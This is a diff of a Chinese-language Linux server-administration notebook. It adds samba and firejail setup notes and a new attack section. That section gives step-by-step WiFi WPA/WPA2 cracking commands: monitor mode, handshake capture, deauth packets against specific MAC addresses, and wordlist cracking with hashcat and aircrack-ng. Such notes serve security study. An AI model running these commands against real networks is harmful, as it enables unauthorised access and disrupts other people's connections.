@@ -1,80 +1,86 @@
-<!-- vim-markdown-toc GFM -->
+<!-- mtoc-start -->
 
 * [server(服务配置)](#server服务配置)
-    * [系统优化](#系统优化)
-        * [trim(统一文件系统与ssd删除)](#trim统一文件系统与ssd删除)
-        * [irqbalance(中断分配多cpu)](#irqbalance中断分配多cpu)
-        * [关闭按Control-Alt-Delete就重启](#关闭按control-alt-delete就重启)
-    * [su, sudo](#su-sudo)
-    * [ssh](#ssh)
-        * [ByteByteGo：SSH 是如何工作的？](#bytebytegossh-是如何工作的)
-        * [基本概念](#基本概念)
-        * [远程连接](#远程连接)
-        * [/etc/ssh/sshd_config 配置文件](#etcsshsshd_config-配置文件)
-        * [ssh-agent管理私钥的passphrase密码，日后不需要输入passphrase就可以远程连接](#ssh-agent管理私钥的passphrase密码日后不需要输入passphrase就可以远程连接)
-        * [快速连接](#快速连接)
-        * [knowclub：史上最全 SSH 暗黑技巧详解](#knowclub史上最全-ssh-暗黑技巧详解)
-            * [内部堡垒机、跳板机都需要密码+动态码，太复杂了，怎么解？](#内部堡垒机跳板机都需要密码动态码太复杂了怎么解)
-            * [我有很多不同机房（或者说不同客户）的机器都需要跳板机来登录，能一次直接ssh上去吗？](#我有很多不同机房或者说不同客户的机器都需要跳板机来登录能一次直接ssh上去吗)
-            * [将隔离环境中的web端口映射到本地（本地代理）](#将隔离环境中的web端口映射到本地本地代理)
-            * [指定算法来强制client端使用某种和server一致的加密方式](#指定算法来强制client端使用某种和server一致的加密方式)
-            * [SSH 三大转发模式](#ssh-三大转发模式)
-        * [autossh：启动 ssh 服务并进行监控的命令行应用程序，可以在程序问题或者是网络问题的时候，重启 ssh 服务。](#autossh启动-ssh-服务并进行监控的命令行应用程序可以在程序问题或者是网络问题的时候重启-ssh-服务)
-        * [ssh3：使用 QUIC + TLS 重新实现的 SSH 加密登陆工具，支持 UDP 端口转发](#ssh3使用-quic--tls-重新实现的-ssh-加密登陆工具支持-udp-端口转发)
-        * [sshfs：ssh将远程目录挂载到本地](#sshfsssh将远程目录挂载到本地)
-        * [pdsh(ssh 并行管理)](#pdshssh-并行管理)
-        * [pssh](#pssh)
-    * [服务(server)](#服务server)
-        * [DNS](#dns)
-            * [systemd-resolved (DNS over tls,cache server,LLMNR)](#systemd-resolved-dns-over-tlscache-serverllmnr)
-        * [nfs](#nfs)
-        * [proxy(代理)服务器](#proxy代理服务器)
-            * [squid](#squid)
-            * [stunnel](#stunnel)
-        * [VPN](#vpn)
-            * [openvpn](#openvpn)
-            * [wireguard](#wireguard)
-    * [安全(security)](#安全security)
-        * [以redis为例的服务检查](#以redis为例的服务检查)
-        * [ssh](#ssh-1)
-            * [sshguard：阻止SSH暴力攻击](#sshguard阻止ssh暴力攻击)
-            * [fail2ban：阻止SSH暴力攻击](#fail2ban阻止ssh暴力攻击)
-            * [denyhosts：阻止SSH暴力攻击](#denyhosts阻止ssh暴力攻击)
-        * [重要文件加锁chattr -i](#重要文件加锁chattr--i)
-        * [ntp(同步时间服务)](#ntp同步时间服务)
-        * [关闭 core dump](#关闭-core-dump)
-        * [selinux](#selinux)
-        * [tcp_wrappers: 第二层防火墙](#tcp_wrappers-第二层防火墙)
-        * [aide：保存当前文件的状态（新增的文件、修改时间、权限、文件哈希值），日后可以对比](#aide保存当前文件的状态新增的文件修改时间权限文件哈希值日后可以对比)
-        * [metasploit](#metasploit)
-        * [rkhunter: 检查 rookit](#rkhunter-检查-rookit)
-        * [clamav: 病毒扫描](#clamav-病毒扫描)
-        * [sqlmap: 自动检测和利用 SQL 注入漏洞，获得数据库服务器的权限。](#sqlmap-自动检测和利用-sql-注入漏洞获得数据库服务器的权限)
-        * [ghauri：自动检测和利用 SQL 注入漏洞](#ghauri自动检测和利用-sql-注入漏洞)
-        * [beef: web渗透测试](#beef-web渗透测试)
-        * [lynis（安全审计以及加固工具）](#lynis安全审计以及加固工具)
-        * [hydra：密码破解](#hydra密码破解)
-        * [fscan：开源的内网安全扫描工具提供了一键自动化全方位的漏洞扫描。它使用方便、功能全面，支持端口扫描、常见的服务器爆破、Web 应用漏洞扫描、NetBIOS 嗅探等功能。](#fscan开源的内网安全扫描工具提供了一键自动化全方位的漏洞扫描它使用方便功能全面支持端口扫描常见的服务器爆破web-应用漏洞扫描netbios-嗅探等功能)
-        * [clamav：cisco的反病毒引擎](#clamavcisco的反病毒引擎)
-    * [系统监控](#系统监控)
-        * [cockpit(系统监控的webui)](#cockpit系统监控的webui)
-    * [自动化任务](#自动化任务)
-        * [cron](#cron)
-        * [anacron](#anacron)
-        * [jenkins](#jenkins)
-            * [安装](#安装)
-            * [插件与配置](#插件与配置)
-            * [新建任务 Maven项目](#新建任务-maven项目)
-            * [pipeline流水线](#pipeline流水线)
-            * [Jenkins：手把手教会你 Jenkins 备份与恢复](#jenkins手把手教会你-jenkins-备份与恢复)
-        * [Gitlab-CI](#gitlab-ci)
-    * [Gitlab-CE](#gitlab-ce)
-            * [安装](#安装-1)
-    * [日志软件](#日志软件)
-        * [logrotate（自带的日志分割工具）](#logrotate自带的日志分割工具)
-        * [rsyslog](#rsyslog)
+  * [系统优化](#系统优化)
+    * [trim(统一文件系统与ssd删除)](#trim统一文件系统与ssd删除)
+    * [irqbalance(中断分配多cpu)](#irqbalance中断分配多cpu)
+    * [关闭按Control-Alt-Delete就重启](#关闭按control-alt-delete就重启)
+  * [su, sudo](#su-sudo)
+  * [ssh](#ssh)
+    * [ByteByteGo：SSH 是如何工作的？](#bytebytegossh-是如何工作的)
+    * [基本概念](#基本概念)
+    * [远程连接](#远程连接)
+    * [/etc/ssh/sshd_config 配置文件](#etcsshsshd_config-配置文件)
+    * [ssh-agent管理私钥的passphrase密码，日后不需要输入passphrase就可以远程连接](#ssh-agent管理私钥的passphrase密码日后不需要输入passphrase就可以远程连接)
+    * [快速连接](#快速连接)
+    * [knowclub：史上最全 SSH 暗黑技巧详解](#knowclub史上最全-ssh-暗黑技巧详解)
+      * [内部堡垒机、跳板机都需要密码+动态码，太复杂了，怎么解？](#内部堡垒机跳板机都需要密码动态码太复杂了怎么解)
+      * [我有很多不同机房（或者说不同客户）的机器都需要跳板机来登录，能一次直接ssh上去吗？](#我有很多不同机房或者说不同客户的机器都需要跳板机来登录能一次直接ssh上去吗)
+      * [将隔离环境中的web端口映射到本地（本地代理）](#将隔离环境中的web端口映射到本地本地代理)
+      * [指定算法来强制client端使用某种和server一致的加密方式](#指定算法来强制client端使用某种和server一致的加密方式)
+      * [SSH 三大转发模式](#ssh-三大转发模式)
+    * [autossh：启动 ssh 服务并进行监控的命令行应用程序，可以在程序问题或者是网络问题的时候，重启 ssh 服务。](#autossh启动-ssh-服务并进行监控的命令行应用程序可以在程序问题或者是网络问题的时候重启-ssh-服务)
+    * [ssh3：使用 QUIC + TLS 重新实现的 SSH 加密登陆工具，支持 UDP 端口转发](#ssh3使用-quic--tls-重新实现的-ssh-加密登陆工具支持-udp-端口转发)
+    * [sshfs：ssh将远程目录挂载到本地](#sshfsssh将远程目录挂载到本地)
+    * [pdsh(ssh 并行管理)](#pdshssh-并行管理)
+    * [pssh](#pssh)
+  * [服务(server)](#服务server)
+    * [DNS](#dns)
+      * [systemd-resolved (DNS over tls,cache server,LLMNR)](#systemd-resolved-dns-over-tlscache-serverllmnr)
+    * [nfs](#nfs)
+    * [proxy(代理)服务器](#proxy代理服务器)
+      * [squid](#squid)
+      * [stunnel](#stunnel)
+    * [VPN](#vpn)
+      * [openvpn](#openvpn)
+      * [wireguard](#wireguard)
+    * [文件传输](#文件传输)
+      * [samba](#samba)
+  * [安全(security)](#安全security)
+    * [以redis为例的服务检查](#以redis为例的服务检查)
+    * [ssh](#ssh-1)
+      * [sshguard：阻止SSH暴力攻击](#sshguard阻止ssh暴力攻击)
+      * [fail2ban：阻止SSH暴力攻击](#fail2ban阻止ssh暴力攻击)
+      * [denyhosts：阻止SSH暴力攻击](#denyhosts阻止ssh暴力攻击)
+    * [firejail：安全运行软件](#firejail安全运行软件)
+    * [重要文件加锁chattr -i](#重要文件加锁chattr--i)
+    * [ntp(同步时间服务)](#ntp同步时间服务)
+    * [关闭 core dump](#关闭-core-dump)
+    * [selinux](#selinux)
+    * [tcp_wrappers: 第二层防火墙](#tcp_wrappers-第二层防火墙)
+    * [aide：保存当前文件的状态（新增的文件、修改时间、权限、文件哈希值），日后可以对比](#aide保存当前文件的状态新增的文件修改时间权限文件哈希值日后可以对比)
+    * [metasploit](#metasploit)
+    * [rkhunter: 检查 rookit](#rkhunter-检查-rookit)
+    * [clamav: 病毒扫描](#clamav-病毒扫描)
+    * [sqlmap: 自动检测和利用 SQL 注入漏洞，获得数据库服务器的权限。](#sqlmap-自动检测和利用-sql-注入漏洞获得数据库服务器的权限)
+    * [ghauri：自动检测和利用 SQL 注入漏洞](#ghauri自动检测和利用-sql-注入漏洞)
+    * [beef: web渗透测试](#beef-web渗透测试)
+    * [lynis（安全审计以及加固工具）](#lynis安全审计以及加固工具)
+    * [fscan：开源的内网安全扫描工具提供了一键自动化全方位的漏洞扫描。它使用方便、功能全面，支持端口扫描、常见的服务器爆破、Web 应用漏洞扫描、NetBIOS 嗅探等功能。](#fscan开源的内网安全扫描工具提供了一键自动化全方位的漏洞扫描它使用方便功能全面支持端口扫描常见的服务器爆破web-应用漏洞扫描netbios-嗅探等功能)
+    * [clamav：cisco的反病毒引擎](#clamavcisco的反病毒引擎)
+  * [攻击](#攻击)
+    * [aircrack-ng：wifi破解](#aircrack-ngwifi破解)
+    * [hydra：密码破解](#hydra密码破解)
+    * [burp-suite：浏览器抓包](#burp-suite浏览器抓包)
+  * [系统监控](#系统监控)
+    * [cockpit(系统监控的webui)](#cockpit系统监控的webui)
+  * [自动化任务](#自动化任务)
+    * [cron](#cron)
+    * [anacron](#anacron)
+    * [jenkins](#jenkins)
+      * [安装](#安装)
+      * [插件与配置](#插件与配置)
+      * [新建任务 Maven项目](#新建任务-maven项目)
+      * [pipeline流水线](#pipeline流水线)
+      * [Jenkins：手把手教会你 Jenkins 备份与恢复](#jenkins手把手教会你-jenkins-备份与恢复)
+    * [Gitlab-CI](#gitlab-ci)
+  * [Gitlab-CE](#gitlab-ce)
+    * [安装](#安装-1)
+  * [日志软件](#日志软件)
+    * [logrotate（自带的日志分割工具）](#logrotate自带的日志分割工具)
+    * [rsyslog](#rsyslog)
 
-<!-- vim-markdown-toc -->
+<!-- mtoc-end -->
 
 # server(服务配置)
 
@@ -1042,6 +1048,48 @@ openvpn --genkey secret /etc/openvpn/server/ta.key
     wg-quick up wg0
     ```
 
+### 文件传输
+
+#### samba
+
+- archlinux安装的samba并不提供默认的配置文件。需要自行下载[smb.conf](https://git.samba.org/samba.git/?p=samba.git;a=blob_plain;f=examples/smb.conf.default;hb=HEAD)
+
+    ```sh
+    sudo curl -o /etc/samba/smb.conf "https://git.samba.org/samba.git/?p=samba.git;a=blob_plain;f=examples/smb.conf.default;hb=HEAD"
+    ```
+
+- 修改配置文件。注销`[public]`
+    ```ini
+    [public]
+       comment = Public Stuff
+       path = /home/tz/Downloads
+       # 是否需要密码。yes为不需要
+       public = yes
+       # 只读
+       writable = no
+       printable = no
+       write list = @staff
+    ```
+
+- 启动
+    ```sh
+    # 设置用户的smb密码
+    sudo smbpasswd -a tz
+
+    # 修改防火墙配置
+    sudo iptables -A INPUT -p tcp --dport 139 -j ACCEPT
+    sudo iptables -A INPUT -p udp --dport 137 -j ACCEPT
+    sudo iptables -A INPUT -p udp --dport 138 -j ACCEPT
+    sudo iptables -A INPUT -p tcp --dport 445 -j ACCEPT
+    sudo iptables -A INPUT -p udp --dport 445 -j ACCEPT
+
+    # 启动smb
+    systemctl start smb
+
+    # 访问smb
+    smbclient //127.0.0.1/public
+    ```
+
 ## 安全(security)
 
 ### 以redis为例的服务检查
@@ -1232,6 +1280,27 @@ wget http://mirror.neu.edu.cn/fedora-epel/7/x86_64/d/denyhosts-2.9-4.el7.noarch.
 rpm -ivh denyhosts-2.9-4.el7.noarch.rpm
 ```
 
+### firejail：安全运行软件
+
+- 启动firejail
+    ```sh
+    firecfg
+    ```
+
+- 默认的软件配置项在`/etc/firejail`目录下
+
+- 新建一个w3m的软件配置
+    ```sh
+    # 禁止w3m访问网络
+    echo 'net none' > ~/.config/firejail/w3m.local
+
+    # 别名w3m
+    alias w3m='firejail --profile=~/.config/firejail/w3m.local w3m'
+
+    # 会发现无法使用网络
+    w3m www.baidu.com
+    ```
+
 ### 重要文件加锁chattr -i
 
 - `chattr -i` 不能修改和删除文件
@@ -1413,8 +1482,6 @@ clamscan -r --remove /
 lynis audit system
 ```
 
-### [hydra：密码破解](https://github.com/vanhauser-thc/thc-hydra)
-
 ### [fscan：开源的内网安全扫描工具](https://github.com/shadow1ng/fscan)提供了一键自动化全方位的漏洞扫描。它使用方便、功能全面，支持端口扫描、常见的服务器爆破、Web 应用漏洞扫描、NetBIOS 嗅探等功能。
 
 ### [clamav：cisco的反病毒引擎](https://github.com/Cisco-Talos/clamav)
@@ -1540,6 +1607,100 @@ systemctl status clamav-daemon
     ss -tulnp | grep clamd
     tcp   LISTEN 0      15           0.0.0.0:3310      0.0.0.0:*    users:(("clamd",pid=895,fd=4))
     ```
+
+## 攻击
+
+### [aircrack-ng：wifi破解](https://github.com/aircrack-ng/aircrack-ng)
+
+- [airgorah：gui版](https://github.com/martin-olivier/airgorah)
+
+- [wifi-cracking：aircrack-ng教程](https://github.com/brannondorsey/wifi-cracking)
+
+```sh
+# archlinux安装
+paru -S aircrack-ng
+paru -S hashcat-utils
+```
+
+- 抓取握手包准备工作
+
+    ```sh
+    # 列出支持监听模式的网卡。如果没有，则说明您的无线网卡不支持监视器模式。
+    airmon-ng
+
+    # 启动wlan0的监听模式
+    airmon-ng start wlan0
+
+    # 查看是不是被没有wlan0，而出现wlan0mon。则表示开启监听模式成功。
+    iwconfig
+
+    # 监听附近的802.11 beacon frames。PWR为信号，绝对值越小越好；BSSID为mac地址，CH为信道，这两个需要记住。
+    airodump-ng wlan0mon
+
+    # 新建目录
+    mkdir /tmp/test
+
+    # 抓取握手包（WPA/WPA2使用4次握手），需要等连接wifi的设备重新连接。如果不想等，可以使用deauth攻击。显示[ WPA handshake: bc:CC:89:5E:92:D9:B0则表示成功抓取。
+    # -c表示信道 --bssid表示mac地址，并将抓取的握手包保存在/tmp/test目录下。
+    # ??失败不知道为什么无法显示连接wifi设备的条目，同时也无法抓取握手包。
+    airodump-ng -c 11 --bssid 9C:5C:8E:C9:AB:C0 -w /tmp/test/ wlan0mon
+
+    # 抓取成功后，按ctrl-c退出airodump-ng。我这里进行了重命名文件
+    mv /tmp/test/-01.cap /tmp/test/hackme.cap
+    ```
+
+- deauth攻击：伪造的取消身份验证数据包，发送到连接wifi的设备。收到此类数据包后，大多数设备会断开与wifi并立即重新连接
+    ```sh
+    # 打开一个新终端
+    # -0 2 发送2个deauth packets
+    # -a 路由器的mac地址
+    # -c 连接wifi设备的mac地址
+    aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 wlan0mon
+
+    # 也可以使用广播
+    aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 wlan0mon
+    ```
+
+- 破解密码
+    ```sh
+    # 下载密码字典
+    curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+    ```
+
+- 使用`naive-hashcat`破解
+    ```sh
+    # 将cap转换成hccapx，需要安装hashcat-utils包。在线转换网址https://hashcat.net/cap2hashcat/
+    cap2hccapx hackme.cap hackme.hccapx
+
+    # 下载naive-hashcat
+    git clone https://github.com/brannondorsey/naive-hashcat
+    mv hackme.hccapx naive-hashcat/
+    mv rockyou.txt naive-hashcat/dicts/
+    cd naive-hashcat
+
+    # 2500 表示 hash mode 为 WPA/WPA2
+    HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
+    ```
+
+- 使用`hashcat`破解
+
+    - [教程](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
+
+    ```sh
+    # archlinux安装hashcat
+    pacman -S hashcat
+    ```
+
+- 使用`aircrack-ng`破解
+
+    ```sh
+    # 破解。-a2 specifies WPA2, -b is the BSSID, -w is the wordfile。如果看到 KEY FOUND! [ 88888888 ] 表示密码被破解，密码为88888888
+    aircrack-ng -a2 -b 08:4F:C9:66:77:3A -w rockyou.txt hackme.cap
+    ```
+
+### [hydra：密码破解](https://github.com/vanhauser-thc/thc-hydra)
+
+### burp-suite：浏览器抓包
 
 ## 系统监控
 
